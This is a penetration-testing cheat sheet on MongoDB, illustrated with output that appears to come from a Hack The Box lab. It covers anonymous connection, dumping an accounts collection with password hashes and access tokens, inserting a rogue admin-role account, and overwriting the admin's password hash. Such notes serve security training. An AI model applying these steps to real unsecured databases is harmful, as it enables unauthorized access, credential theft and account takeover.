---
title: "MongoDB General"
date: 2025-7-25
tags: ["Database Dumping", "Mongodb", "Database", "Enumeration"]
---

#### Connect to Mongo Database

{{< tab set1 tab1 >}}anonymous{{< /tab >}}
{{< tab set1 tab2 >}}authenticate{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
mongosh <TARGET>:27017
```

```console {class="sample-code"}
$ mongosh 172.17.0.3:27017
Current Mongosh Log ID: 66f2fa2192b07a1eeb856ec6
Connecting to:          mongodb://172.17.0.3:27017/?directConnection=true&appName=mongosh+2.2.12
Using MongoDB:          5.0.6
Using Mongosh:          2.2.12

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

------
   The server generated these startup warnings when booting
   2024-09-24T10:44:22.876+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
   2024-09-24T10:44:23.824+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
------

Warning: Found ~/.mongorc.js, but not ~/.mongoshrc.js. ~/.mongorc.js will not be loaded.
  You may want to copy or rename ~/.mongorc.js to ~/.mongoshrc.js.
test> 
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Connect local with creds and specified database
mongo -u <USER> -p '<PASSWORD>' <DB_NAME>
```

{{< /tabcontent >}}

#### General

```console
# Show all databases
show dbs
```

```console {class="sample-code"}
test> show dbs
admin    132.00 KiB
config    72.00 KiB
local     88.00 KiB
trudesk    1.01 MiB
```

```console
# Choose database
use <DB_NAME>
```

```console {class="sample-code"}
test> use trudesk
switched to db trudesk
```

```console
# Show all collections
show collections
```

```console {class="sample-code"}
trudesk> show collections
accounts
counters
departments
groups
messages
---[SNIP]---
```

```console
# Show all of the collection
db.<COLLECTION_NAME>.find().pretty()
```

```console {class="sample-code"}
trudesk> db.accounts.find().pretty()
[
  {
    _id: ObjectId('623c8b20855cc5001a8ba13c'),
    preferences: {
      tourCompleted: false,
      autoRefreshTicketGrid: true,
      openChatWindows: []
    },
    hasL2Auth: false,
    deleted: false,
    username: 'admin',
    password: '$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS',
    fullname: 'Robert Frost',
    email: 'rfrost@carpediem.htb',
    role: ObjectId('623c8b20855cc5001a8ba138'),
    title: 'Sr. Network Engineer',
    accessToken: '22e56ec0b94db029b07365d520213ef6f5d3d2d9',
    __v: 0,
    lastOnline: ISODate('2022-04-07T20:30:32.198Z')
  },
---[SNIP]---
```

```console
# Insert entry into collections
db.<COLLECTION_NAME>.insert({"<key>": "<value>"})
```

```console {class="sample-code"}
trudesk> db.accounts.insert({_id: ObjectId('33f3b8a827983e3773023633'),preferences: {tourCompleted: false,autoRefreshTicketGrid: true,openChatWindows: []},hasL2Auth: false,deleted: false,username: 'test',password: '$2b$10$imwoLPu0Au8LjNr08GXGy.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS',fullname: 'Test USer',email: 'test@carpediem.htb',role: ObjectId('623c8b20855cc5001a8ba138'),title: 'Test',accessToken: '3fd5a5e64963cd4b973480032125011568fee525',__v: 0,lastOnline: ISODate('2022-04-07T20:30:32.198Z')})
{
  acknowledged: true,
  insertedIds: { '0': ObjectId('33f3b8a827983e3773023633') }
}
```

```console
# Update an entry (e.g. password of user)
db.<COLLECTION_NAME>.updateOne({"username": "user"}, {$set: {"password": "password"}});
```

```console {class="sample-code"}
trudesk> db.accounts.updateOne({"username":"admin"}, {$set:{"password":"$2b$04$gj6qKJ4AhURmyt1wnUfPsOPebiur236k1m57BwteWHDV2fzJL74Yq"}})
{
  acknowledged: true,
  insertedId: null,
  matchedCount: 1,
  modifiedCount: 0,
  upsertedCount: 0
}
```